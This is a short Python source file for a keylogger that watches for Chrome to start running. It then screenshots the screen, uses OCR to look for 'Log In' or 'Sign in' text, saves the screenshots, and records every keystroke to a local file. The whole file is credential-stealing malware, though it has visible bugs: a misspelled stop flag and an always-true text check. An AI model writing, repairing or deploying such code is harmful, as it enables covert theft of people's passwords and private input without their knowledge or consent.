from pynput import keyboard
import logging
import subprocess
import time
from PIL import ImageGrab
import pytesseract


class KeyLogger():

    def __init__(self):
        self.stopLogging = False
        logging.basicConfig(filename="data.txt",level=logging.DEBUG,format="%(message)s")
    def onPress(self, key):
        logging.debug(key)
        if key == keyboard.Key.enter:
            self.stoLogging = True
            print("here")

    def beginLog(self):

        with keyboard.Listener(on_press=self.onPress) as silent:
            silent.join()
            while not self.stoLogging:
                pass



    def listenForInternet(self):

        while True:
            # Get a list of running processes
            proc_list = subprocess.check_output(['tasklist']).decode('utf-8').split('\n')
            # Check if a browser process is running
            # I am only checking for chrome however you can check for any browser and it will work
            for proc in proc_list:
                if 'chrome.exe' in proc:
                    print('NOW')
                    return True
                    #break
            # Wait for 1 second before checking again

    def getSignIn(self):
        if self.listenForInternet():
            count = 0
            while logging:
                screenshot = ImageGrab.grab()
                text = pytesseract.image_to_string(screenshot)
                if 'Log In' or 'Sign in' in text:
                    screenshot.save('captures/screenshot'+str(count)+'.png')
                    self.beginLog()
                    print("Saved")
                    count += 1

    def run(self):
        if self.listenForInternet():
            self.getSignIn()





if __name__ == "__main__":
    silentLogger = KeyLogger()
    silentLogger.run()